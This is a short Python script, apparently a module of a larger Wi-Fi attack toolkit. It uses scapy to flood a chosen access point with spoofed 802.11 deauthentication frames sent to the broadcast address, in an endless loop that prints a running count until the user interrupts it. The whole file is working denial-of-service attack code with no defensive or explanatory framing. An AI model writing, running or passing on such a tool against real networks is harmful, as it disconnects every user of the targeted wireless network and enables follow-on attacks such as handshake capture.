from scapy.all import *
from lib.colors import *
import logging
import sys

logging.basicConfig(level=logging.DEBUG, format="[{0}%(levelname)s{1}][{2}%(asctime)s{1}]{3}%(message)s{1}".format(LGREEN, RST, BLUE, RD), datefmt="%H:%M:%S")
conf.verb = 0

class deauth_attack:

    def __init__(self, iface, BSSID, channel):
        self.iface = iface
        self.BSSID = BSSID
        self.channel = channel
        self.broadcast = "ff:ff:ff:ff:ff:ff"
        self.packet = Dot11(addr1=self.broadcast, addr2=self.BSSID, addr3=self.BSSID)/Dot11Deauth()

    def deauth(self):
        logging.info(" Sending deauth packets to {} ".format(self.BSSID))
        count = 0
        while True:
            try:
                sys.stdout.write("\r[{1}{2}{0}] {3}Deauth packets sent{0} (Press CTRL+C to cancel)".format(RST, LRED, count, RD))
                sys.stdout.flush()
                sendp(self.packet, iface=self.iface, count=1)
                count += 1
            except KeyboardInterrupt:
                print("\n")
                logging.info(" Exiting...")
                sys.exit(0)
